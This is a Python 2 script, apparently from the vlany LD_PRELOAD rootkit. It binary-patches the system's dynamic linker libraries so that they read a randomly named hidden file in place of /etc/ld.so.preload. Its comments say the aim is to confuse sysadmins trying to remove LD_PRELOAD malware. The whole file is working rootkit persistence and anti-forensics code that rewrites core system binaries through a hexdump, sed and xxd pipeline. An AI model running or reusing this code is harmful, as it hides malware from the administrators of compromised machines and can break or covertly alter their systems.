#!/usr/bin/python2

# modifies the dynamic linker and changes the target location of /etc/ld.so.preload to a random file in a random directory
# this means that ld.so.preload will no longer make a difference, and it'll confuse the fuck out of sysadmins trying to remove any LD_PRELOAD malware on their box
# 'new' ld.so.preload file location can still be discovered by reading the strings in the dynamic linker libraries

# this python script is based off of http://everydaywithlinux.blogspot.co.uk/2012/11/patch-strings-in-binary-files-with-sed.html

# this could also potentially be used to easily prevent LD_PRELOAD attacks on your own boxes :p (assuming you aren't using ld.so.preload for a legit reason already)

import os
import sys
import random
import string
import subprocess

LIB_DIRS = ["/lib/", "/lib32/", "/lib64/"]
P_DIRS = ["/bin/", "/sbin/", "/etc/", "/home/", "/lib/", "/lib64/", "/opt/",  "/usr/", "/var/"] # doesn't really matter where the file is stored since vlany hides it anyway but nothing like a little more obscurity

O_PRELOAD = "/etc/ld.so.preload"

PYL = """hexdump -ve '1/1 "%.2X"' {0} | sed "s/{1}/{2}/g" | xxd -r -p > {0}.tmp
chmod --reference {0} {0}.tmp
mv {0}.tmp {0}"""

def get_n_preload():
    n_preload = "{0}.{1}"
    _dir = random.choice(P_DIRS)
    while not os.path.exists(_dir):
        _dir = random.choice(P_DIRS)
    n_preload = n_preload.format(_dir, ''.join(random.choice(string.ascii_uppercase + string.ascii_lowercase + string.digits) for _ in range(8)))
    return n_preload

def hex_str(_):
	return _.encode("hex").upper() + "00"

def patch_lib(target_lib, o_preload, n_preload):
	print("Attempting to patch {0} by replacing {1} with new string, {2}".format(target_lib, o_preload, n_preload))
	p = subprocess.Popen(["strings", target_lib], stdout=subprocess.PIPE, stderr=subprocess.PIPE)
	out, err = p.communicate()
	for x in out.split("\n"):
		if x == o_preload:
			print("old preload found in {0}: {1}".format(target_lib, x))

			o_preload_hex = hex_str(o_preload)
			n_preload_hex = hex_str(n_preload)

			while(len(n_preload_hex) <> len(o_preload_hex)):
				print("Padding the new preload location with nullbytes.")
				n_preload_hex += "00"

			print("Replacing {0} with {1} in library {2}".format(o_preload, n_preload, target_lib))
			os.system(PYL.format(target_lib, o_preload_hex, n_preload_hex))
			print("{0} patched.".format(target_lib))


def get_ld_locations():
	lib_locations = ""
	for _ in LIB_DIRS:
		if os.path.exists(_):
			for x in os.listdir(_):
				if x.startswith("ld-"):
					lib_locations += "{0}{1}\n".format(_, x)
	return lib_locations

if __name__ == "__main__":
	n_preload = get_n_preload()
        locations = get_ld_locations()[:-1]

	for x in locations.split("\n"):
		patch_lib(x, O_PRELOAD, n_preload)

	f = open("new_preload", "w")
	f.write(n_preload)
	f.close()
